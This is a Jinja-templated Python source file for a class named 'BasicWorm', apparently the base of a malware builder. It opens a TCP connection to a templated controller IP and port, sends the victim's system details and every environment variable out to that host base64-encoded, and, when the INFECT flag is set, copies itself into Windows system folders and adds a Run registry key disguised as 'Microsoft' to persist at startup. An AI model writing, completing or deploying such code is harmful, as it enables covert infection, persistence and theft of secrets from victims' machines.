import socket
import base64
import os
import platform
from time import sleep
from threading import Thread
from multiprocessing import Process
import multiprocessing
{% if INFECT %}
import shutil
import winreg
import sys
import ctypes
from ctypes import wintypes
{% endif %}


class BasicWorm(Process):
    def __init__(self):
        Process.__init__(self)
        self._ip = "{{IP}}"
        self._port = {{PORT}}
        self.addr = (self._ip, self._port)
        self.format_code = "{{FORMAT_CODE}}"
        self.raw_len = {{RAW_LEN}}
        self.sys_msg = "{{SYS_MSG}}"
        self.conn_pause = {{CONN_PAUSE}}
        self._sys_env = None
        self.name = "Unknown"
    
    def _build_socket(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            print("Socket build")
            return True
        except:
            return False
    
    def connect(self):
        try:
            self.client.connect(self.addr)
            print("CONNECTED")
            return True
        except Exception as e:
            print("ERROR CONNECTION: ", e)
            return False
    
    def disconnect(self):
        try:
            self.client.shutdown(socket.SHUT_RDWR)
        except Exception as e:
            print("ERROR SHUT: ", e)
        try:
            self.client.close()
        except Exception as e:
            print("ERROR CLOSE: ", e)   
        print("CLOSE")
    
    def recive_msg(self):
        msg = b""
        try:
            while True:
                recv = self.client.recv(self.raw_len)
                if recv:
                    if len(recv) < self.raw_len:
                        msg += recv
                        break
                    else:
                        msg += recv
                else:
                    return None
            
            out_msg = base64.b64decode(msg)
            return out_msg.decode(self.format_code)
        except:
            print("ERROR recv msg")
            return None
    
    def send_msg(self, msg):
        try:
            send_msg = base64.b64encode(msg.encode(self.format_code))
            self.client.sendall(send_msg)
            return True
        except:
            return False
    
    def send_sys_msg(self, msg):
        rmsg = msg.split(" ")
        rmsg = self.sys_msg + self.sys_msg.join(rmsg) + self.sys_msg
        self.send_msg(rmsg)
    
    def unpack_headers(self, msg):
        rmsg = msg.split(self.sys_msg)
        cmd = []
        for m in rmsg:
            if m == "":
                continue
            cmd.append(m)
        return cmd
    
    def unpack_command(self, msg):
        cmd = []
        msg = msg.split(" ")
        for m in msg:
            if m == "":
                continue
            cmd.append(m)
        return cmd
    
    def get_sys_info(self):
        system = str(platform.system())
        system += "#" + str(platform.release())
        return system
    
    def get_env_var(self):
        try:
            env = os.environ
            self._sys_env = env
            env_var = ""
            for k, i in env.items():
                env_var += f"{k} : {i}\n"
            return env_var
        except:
            return "Unknown"
    
    def _first_action(self):
        sys_info = self.get_sys_info()
        self.send_msg(f"{self.sys_msg}sys_info{self.sys_msg}{sys_info}{self.sys_msg}")
        sleep(1)
        self.send_msg(f"{self.sys_msg}sys_env{self.sys_msg}{self.get_env_var()}{self.sys_msg}")
        sleep(0.5)
        self.send_msg(f"{self.sys_msg}worm_name{self.sys_msg}{self.name}{self.sys_msg}")
        
    
    def first_action(self):
        self._first_action()
{% if INFECT %}
    def _cloning(self, fpath, source=None):
        if not source:
            me = os.path.abspath(sys.argv[0])
        else:
            me = source
        try:
            shutil.copy2(me, fpath)
            return os.path.join(fpath, os.path.basename(me))
        except:
            return None

    def _get_sys_path(self, index=None):
        if not index:
            index = [2, 13, 14, 20, 26, 35, 36, 37, 38, 39, 42]
        shell32 = ctypes.windll.shell32
        buff = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
        sys_path = []
        for i in index:
            result = shell32.SHGetFolderPathW(None, i, None, 0, buff)
            if result == 0:
                sys_path.append(buff.value)

        return sys_path

    def _registry_add(self, fpath):
        try:
            path = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKeyEx(path, "Software\\Microsoft\\Windows\\CurrentVersion")
            new_key = winreg.CreateKey(key, "Run")
            winreg.SetValueEx(new_key, "Microsoft", 0, winreg.REG_SZ, fpath)
            return True
        except:
            return False
    
    def cloning(self):
        loc = self._get_sys_path()
        for l in loc:
            out = self._cloning(l)
            if out:
                reg = self._registry_add(out)
                if reg:
                    return True
        return False
    
    def clone_me(self):
        self.cloning()
{% endif %}

    def run(self):
        {% if INFECT %}
        self.clone_me()
        {% endif %}
        while True:
            if not self._build_socket():
                continue
            while True:
                if self.connect():
                    self.first_action()
                    break
                print(f"Cant Connect pause: {self.conn_pause} sec")
                sleep(self.conn_pause)
            sleep(1)
            next_step = self.RUN()
            if next_step:
                continue
            sleep(1)
            print("DISCONNECT")
            self.disconnect()
            break
    
    def RUN(self):
        return False

   